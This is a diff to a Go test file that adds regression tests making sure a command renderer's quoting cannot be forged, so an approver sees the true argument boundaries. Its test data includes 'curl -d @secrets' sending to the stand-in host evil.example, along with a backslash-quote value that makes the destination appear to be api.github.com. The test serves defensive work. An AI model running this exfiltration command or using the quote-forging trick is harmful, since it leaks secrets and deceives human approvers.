@@ -196,6 +196,16 @@ func TestRenderCommand(t *testing.T) {
 			want: `cmd "" next`,
 		},
 		{
+			name: "escapes a backslash so it cannot forge a closing quote",
+			argv: []string{"curl", "-d", "@secrets", `https://evil.example/\" https://api.github.com/upload`},
+			want: `curl -d @secrets "https://evil.example/\\\" https://api.github.com/upload"`,
+		},
+		{
+			name: "a backslash alone is enough to require quoting",
+			argv: []string{"cmd", `a\b`},
+			want: `cmd "a\\b"`,
+		},
+		{
 			name: "empty argv renders empty",
 			argv: nil,
 			want: "",
@@ -208,6 +218,52 @@ func TestRenderCommand(t *testing.T) {
 			}
 		})
 	}
+}
+
+// TestRenderCommand_QuotingIsUnambiguous states the property the exact-match
+// cases above only imply: an attacker-supplied argument cannot close its own
+// display quote early. Escaping `"` while leaving `\` alone rendered
+// `https://evil.example/\" …` as `…/\\" …`, where the `\\` reads as an escaped
+// backslash and the `"` behind it as the terminator — the approver sees the
+// argument end at evil.example and the next token, api.github.com, as the
+// destination. It is not; the child receives one argument pointing at
+// evil.example.
+//
+// Counting terminators rather than comparing bytes is deliberate: any future
+// escaping scheme that keeps boundaries honest passes, and any that reopens
+// this hole fails, whatever it renders.
+func TestRenderCommand_QuotingIsUnambiguous(t *testing.T) {
+	argv := []string{"curl", "-d", "@secrets", `https://evil.example/\" https://api.github.com/upload`}
+
+	got := caller.RenderCommand(argv)
+
+	if n := countUnescapedQuotes(got); n != 2 {
+		t.Errorf("rendered argument must have exactly one opening and one closing quote, found %d in %q", n, got)
+	}
+	if !strings.Contains(got, "https://evil.example/") || !strings.Contains(got, "https://api.github.com/upload") {
+		t.Errorf("both halves of the argument must still be legible; got %q", got)
+	}
+}
+
+// countUnescapedQuotes counts the double quotes in s that a reader would treat
+// as quote delimiters — i.e. those not preceded by an odd number of
+// backslashes.
+func countUnescapedQuotes(s string) int {
+	n, backslashes := 0, 0
+	for _, r := range s {
+		switch r {
+		case '\\':
+			backslashes++
+		case '"':
+			if backslashes%2 == 0 {
+				n++
+			}
+			backslashes = 0
+		default:
+			backslashes = 0
+		}
+	}
+	return n
 }
 
 // TestRenderCommand_ElisionIsExplicit covers F10: a bare trailing "…" reads as
